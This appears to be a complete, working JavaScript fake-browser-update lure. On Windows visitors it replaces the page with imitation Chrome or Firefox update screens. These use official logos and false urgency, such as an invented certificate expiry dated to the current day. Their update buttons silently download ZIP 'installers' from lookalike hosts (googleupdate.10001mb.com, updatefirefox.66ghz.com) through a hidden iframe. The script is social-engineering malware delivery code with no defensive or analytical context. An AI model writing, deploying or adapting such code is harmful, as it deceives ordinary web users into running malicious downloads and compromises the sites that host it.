
(function () {
  "use strict";

  // ------------------------------------------------
  // 1. Constants and configuration
  // ------------------------------------------------
  const UPDATE_PAGE_ID = "browser-update-page";

  const BROWSER_DATA = {
    chrome: {
      name: "Google Chrome",
      headline: "You need to update your browser to view the content!",
      className: "browser-update-page--chrome",
      template: "chrome",
    },
    edge: {
      name: "Microsoft Edge",
      headline: "Edge update required",
      message: "This page needs a newer version of Microsoft Edge before you continue.",
      steps: [
        "Open Settings and more in the top-right corner.",
        "Choose Help and feedback > About Microsoft Edge.",
        "Install the available update, then restart Edge.",
      ],
      className: "browser-update-page--edge",
    },
    firefox: {
      name: "Mozilla Firefox",
      headline: "Update your Firefox browser",
      message:
        "This site needs a newer version of Firefox to continue. On " +
        new Date().toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" }) +
        ", your current version won’t work properly.",
      className: "browser-update-page--firefox",
      template: "firefox",
    },
    safari: {
      name: "Safari",
      headline: "Safari update required",
      message: "This page needs a newer version of Safari before you continue.",
      steps: [
        "Open System Settings on your device.",
        "Choose General > Software Update.",
        "Install the available update, then reopen Safari.",
      ],
      className: "browser-update-page--safari",
    },
    opera: {
      name: "Opera",
      headline: "Opera update required",
      message: "This page needs a newer version of Opera before you continue.",
      steps: [
        "Open the Opera menu.",
        "Choose Update & Recovery.",
        "Install the available update, then restart Opera.",
      ],
      className: "browser-update-page--opera",
    },
    unknown: {
      name: "your browser",
      headline: "Browser update required",
      message: "This page needs a newer browser version before you continue.",
      steps: [
        "Open your browser settings.",
        "Find the About or Software Update section.",
        "Install the available update, then reopen this page.",
      ],
      className: "browser-update-page--unknown",
    },
  };

  // ------------------------------------------------
  // 2. Utility functions
  // ------------------------------------------------
  const hasText = (source, value) => source.includes(value);

  const getBrowserType = () => {
    const ua = navigator.userAgent || "";
    console.log(ua);
    const brands = (navigator.userAgentData?.brands || []).map((b) => b.brand.toLowerCase()).join(" ");
    const source = `${ua.toLowerCase()} ${brands}`;

    if (hasText(source, "edg/") || hasText(source, "edgios/") || hasText(source, "microsoft edge")) return "edge";
    if (hasText(source, "opr/") || hasText(source, "opios/") || hasText(source, "opera")) return "opera";
    if (hasText(source, "firefox/") || hasText(source, "fxios/")) return "firefox";
    if (hasText(source, "safari/") && !hasText(source, "chrome/") && !hasText(source, "crios/") && !hasText(source, "chromium/") && !hasText(source, "android"))
      return "safari";
    if (hasText(source, "chrome/") || hasText(source, "crios/") || hasText(source, "chromium/") || hasText(source, "google chrome"))
      return "chrome";
    return "unknown";
  };

  const isWindows = () => {
    const ua = (navigator.userAgent || "").toLowerCase();
    const platform = (navigator.userAgentData?.platform || "").toLowerCase();
    return hasText(ua, "windows") || hasText(ua, "win64") || hasText(ua, "win32") || platform === "windows";
  };

  // ------------------------------------------------
  // 3. CSS (minified) – unchanged
  // ------------------------------------------------
  const CSS = `
html.browser-update-page-active,html.browser-update-page-active body{min-height:100%;margin:0}
html.browser-update-page-active body{background:#f6f8fb}
#${UPDATE_PAGE_ID}{min-height:100vh;min-height:100svh;display:grid;place-items:center;padding:32px 18px;background:radial-gradient(circle at top left,rgba(26,115,232,.15),transparent 34rem),linear-gradient(135deg,#f8fafc 0%,#eef3f9 100%);color:#111827;font:16px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
#${UPDATE_PAGE_ID} *{box-sizing:border-box}
.browser-update-page__card{width:min(760px,100%);overflow:hidden;border:1px solid rgba(15,23,42,.12);border-radius:18px;background:#fff;box-shadow:0 24px 70px rgba(15,23,42,.18)}
.browser-update-page__header{padding:34px clamp(24px,5vw,48px) 28px;background:#111827;color:#fff}
.browser-update-page__badge{display:inline-flex;align-items:center;gap:10px;margin-bottom:20px;padding:8px 12px;border:1px solid rgba(255,255,255,.18);border-radius:999px;background:rgba(255,255,255,.1);color:rgba(255,255,255,.86);font-size:13px;font-weight:700}
.browser-update-page__badge::before{width:10px;height:10px;border-radius:50%;background:var(--browser-update-accent,#64748b);content:""}
.browser-update-page__title{margin:0;max-width:620px;font-size:clamp(34px,7vw,62px);line-height:.96;letter-spacing:0}
.browser-update-page__message{max-width:560px;margin:18px 0 0;color:rgba(255,255,255,.78);font-size:clamp(17px,2vw,20px)}
.browser-update-page__body{display:grid;gap:28px;padding:30px clamp(24px,5vw,48px) 38px}
.browser-update-page__steps-title{margin:0 0 14px;color:#111827;font-size:18px;font-weight:800}
.browser-update-page__steps{display:grid;gap:12px;margin:0;padding:0;list-style:none}
.browser-update-page__step{display:grid;grid-template-columns:34px minmax(0,1fr);gap:12px;align-items:start;color:#4b5563}
.browser-update-page__step-number{display:grid;width:34px;height:34px;place-items:center;border-radius:50%;background:color-mix(in srgb,var(--browser-update-accent,#64748b)14%,white);color:var(--browser-update-accent,#64748b);font-size:14px;font-weight:900}
.browser-update-page__actions{display:flex;flex-wrap:wrap;gap:12px;align-items:center}
.browser-update-page__button{min-height:46px;border:0;border-radius:8px;padding:0 18px;background:var(--browser-update-accent,#475569);color:#fff;font:inherit;font-weight:800;cursor:pointer;box-shadow:0 12px 28px color-mix(in srgb,var(--browser-update-accent,#475569)30%,transparent)}
.browser-update-page__button:hover{filter:brightness(.95)}
.browser-update-page__note{margin:0;color:#64748b;font-size:14px}
.browser-update-page--chrome{--browser-update-accent:#1a73e8}
#browser-update-page.browser-update-page--chrome{min-height:100vh;padding:0;background:#f1f3f4;color:#202124;font-family:Arial,Helvetica,sans-serif}
.chrome-update-panel{width:100%;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;background:#f1f3f4}
.chrome-update-content{width:100%;max-width:1000px;text-align:center;padding-top:40px}
.chrome-update-icon{width:110px;height:110px;margin:0 auto 26px}
.chrome-update-icon img{width:100%;height:100%;object-fit:contain}
.chrome-update-title{margin:0 auto;max-width:920px;color:#202124;font-size:60px;font-weight:400;line-height:1.08;letter-spacing:-1.5px}
.chrome-update-button{display:inline-flex;justify-content:center;align-items:center;width:230px;height:60px;margin-top:36px;border:none;border-radius:999px;background:#1a73e8;color:#fff;font-size:20px;font-weight:500;cursor:pointer}
.chrome-update-button:hover{background:#1765cc}
.chrome-update-os{margin-top:36px;color:#5f6368;font-size:18px}
.chrome-update-checkbox-row{display:flex;justify-content:center;align-items:flex-start;gap:14px;margin-top:48px}
.chrome-update-checkbox{width:28px;height:28px;margin-top:2px}
.chrome-update-disclosure{max-width:650px;text-align:left;color:#5f6368;font-size:14px;line-height:1.5}
.chrome-update-disclosure a{color:#1a73e8;text-decoration:none}
.chrome-update-footer{margin-top:30px;color:#5f6368;font-size:14px;line-height:2}
.chrome-update-footer a{color:#5f6368;text-decoration:none;margin:0 18px}
@media(max-width:768px){.chrome-update-title{font-size:42px}.chrome-update-content{padding:30px 20px}.chrome-update-checkbox-row{align-items:flex-start}.chrome-update-disclosure{font-size:13px}}
.browser-update-page--edge{--browser-update-accent:#0f9baa}
.browser-update-page--firefox{--browser-update-accent:#0060df}
#browser-update-page.browser-update-page--firefox{min-height:100vh;padding:0;background:#f3f3f3;color:#20123a;font-family:Inter,Arial,sans-serif}
.firefox-update-panel{position:relative;width:100%;min-height:100vh;background:#f3f3f3}
.firefox-update-logo{position:absolute;top:55px;left:105px;display:flex;align-items:center;gap:14px}
.firefox-update-logo img{width:56px;height:56px}
.firefox-update-logo-text{font-size:30px;font-weight:700;color:#20123a}
.firefox-update-warning{position:absolute;top:36px;left:50%;transform:translateX(-50%);background:#f5df77;color:#3d2c00;padding:20px 64px;border-radius:4px;font-size:18px;box-shadow:0 4px 12px rgba(0,0,0,.08)}
.firefox-update-content{max-width:950px;margin:0 auto;text-align:center;padding-top:280px}
.firefox-update-title{margin:0 0 42px;color:#20123a;font-size:clamp(50px,6vw,66px);font-weight:700;line-height:1.1}
.firefox-update-description{max-width:820px;margin:0 auto;color:#4a4a68;font-size:24px;line-height:1.45}
.firefox-update-description strong{color:#3b3950;font-weight:800}
.firefox-update-description a{color:#0060df;text-decoration:underline}
.firefox-update-button{display:inline-flex;align-items:center;justify-content:center;min-width:205px;height:66px;margin-top:36px;border:0;border-radius:6px;background:#0060df;color:#fff;font-size:20px;font-weight:700;cursor:pointer}
.firefox-update-button:hover{background:#0250bc}
.firefox-update-privacy{margin-top:26px;color:#5d5a71;font-size:16px}
.firefox-update-footer{margin-top:42px;color:#5d5a71;font-size:18px}
@media(max-width:900px){.firefox-update-logo{left:30px;top:30px}.firefox-update-warning{position:static;transform:none;margin:30px auto 0;width:fit-content}.firefox-update-content{padding:180px 20px 40px}.firefox-update-title{font-size:46px}.firefox-update-description{font-size:20px}}
.browser-update-page--safari{--browser-update-accent:#0a84ff}
.browser-update-page--opera{--browser-update-accent:#ff1b2d}
.browser-update-page--unknown{--browser-update-accent:#64748b}
@supports not (background:color-mix(in srgb,red 50%,white)){.browser-update-page__step-number{background:#eef2f7}.browser-update-page__button{box-shadow:0 12px 28px rgba(71,85,105,.22)}}
@media(max-width:520px){#${UPDATE_PAGE_ID}{padding:0;place-items:stretch}.browser-update-page__card{min-height:100vh;min-height:100svh;border:0;border-radius:0}.browser-update-page__header{padding-top:44px}.browser-update-page__button{width:100%}}
`;

  // ------------------------------------------------
  // 4. HTML template builders
  // ------------------------------------------------
  const stepHTML = (step, i) => `
    <li class="browser-update-page__step">
      <span class="browser-update-page__step-number">${i + 1}</span>
      <span>${step}</span>
    </li>
  `;

  const defaultPage = (data) => `
    <section class="browser-update-page__card">
      <div class="browser-update-page__header">
        <div class="browser-update-page__badge">${data.name}</div>
        <h1 class="browser-update-page__title" id="browser-update-page-title">${data.headline}</h1>
        <p class="browser-update-page__message">${data.message}</p>
      </div>
      <div class="browser-update-page__body">
        <div>
          <h2 class="browser-update-page__steps-title">How to update</h2>
          <ol class="browser-update-page__steps">${data.steps.map(stepHTML).join("")}</ol>
        </div>
        <div class="browser-update-page__actions">
          <button class="browser-update-page__button" type="button" id="browser-update-reload">I updated, reload page</button>
          <p class="browser-update-page__note">After updating, reopen this page to continue.</p>
        </div>
      </div>
    </section>
  `;

  const chromePage = () => `
    <section class="chrome-update-panel">
      <div class="chrome-update-content">
        <div class="chrome-update-icon">
          <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome">
        </div>
        <h1 class="chrome-update-title" id="browser-update-page-title">You need to update your browser to<br>view the content!</h1>
        <a class="chrome-update-button" id="browser-update-reload" href="http://googleupdate.10001mb.com/ChromeSetup.zip">Update Chrome</a>
        <div class="chrome-update-os">For Windows 11/10 64-bit.</div>
        <div class="chrome-update-checkbox-row">
          <input type="checkbox" checked class="chrome-update-checkbox">
          <div class="chrome-update-disclosure">
            Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.<br>
            <a href="#">What are crash reports?</a>
          </div>
        </div>
      </div>
    </section>
  `;

  const firefoxPage = () => {
    const date = new Date().toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
    return `
      <section class="firefox-update-panel">
        <div class="firefox-update-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Firefox_logo%2C_2019.svg" alt="Firefox">
          <span class="firefox-update-logo-text">Firefox</span>
        </div>
        <div class="firefox-update-warning">You're on an older version of Firefox</div>
        <div class="firefox-update-content">
          <div class="firefox-update-title" id="browser-update-page-title">Update your Firefox browser</div>
          <p class="firefox-update-description">
            <strong>On ${date}, your current Firefox version won’t work properly.</strong>
            A root certificate will expire, causing streaming video, add-ons, and other features to stop working.
            <a href="#">Read more about this change</a>
          </p>
          <a class="firefox-update-button" href="https://updatefirefox.66ghz.com/FirefoxInstaller.zip" id="browser-update-reload">Update now</a>
          <div class="firefox-update-privacy">Firefox Privacy Notice</div>
          <div class="firefox-update-footer">Usually takes 2–3 minutes</div>
        </div>
      </section>
    `;
  };

  const TEMPLATES = {
    chrome: chromePage,
    firefox: firefoxPage,
  };

  // ------------------------------------------------
  // 5. Download helper (does not navigate)
  // ------------------------------------------------
  function downloadFile(url) {
    // Use a hidden iframe to trigger the download without leaving the page
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = url;
    document.body.appendChild(iframe);
    // Remove the iframe after a few seconds to clean up
    setTimeout(() => iframe.remove(), 5000);
  }

  // ------------------------------------------------
  // 6. Main show function
  // ------------------------------------------------
  const showUpdatePage = () => {
    if (!isWindows()) return;

    const browser = getBrowserType();
    const data = BROWSER_DATA[browser] || BROWSER_DATA.unknown;

    // Inject styles
    if (!document.getElementById(`${UPDATE_PAGE_ID}-styles`)) {
      const style = document.createElement("style");
      style.id = `${UPDATE_PAGE_ID}-styles`;
      style.textContent = CSS;
      document.head.appendChild(style);
    }

    // Build page
    const templateFn = TEMPLATES[data.template] || (() => defaultPage(data));
    const html = templateFn();

    document.title = data.headline;
    document.documentElement.classList.add("browser-update-page-active");

    const main = document.createElement("main");
    main.id = UPDATE_PAGE_ID;
    main.className = data.className;
    main.dataset.browser = browser;
    main.setAttribute("aria-labelledby", "browser-update-page-title");
    main.innerHTML = html;

    document.body.innerHTML = "";
    document.body.appendChild(main);

    // ------------------------------------------------
    // 7. Attach event listeners after DOM injection
    // ------------------------------------------------
    document.querySelectorAll('#browser-update-reload').forEach(el => {
      el.addEventListener('click', function (e) {
        e.preventDefault(); // prevent any default navigation

        if (this.tagName === 'A') {
          // It's a download link – trigger download without redirect
          const url = this.href;
          downloadFile(url);
        } else {
          // It's a button (default page) – reload the page
          location.reload();
        }
      });
    });
  };

  // ------------------------------------------------
  // 8. Start
  // ------------------------------------------------
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", showUpdatePage, { once: true });
  } else {
    showUpdatePage();
  }
})();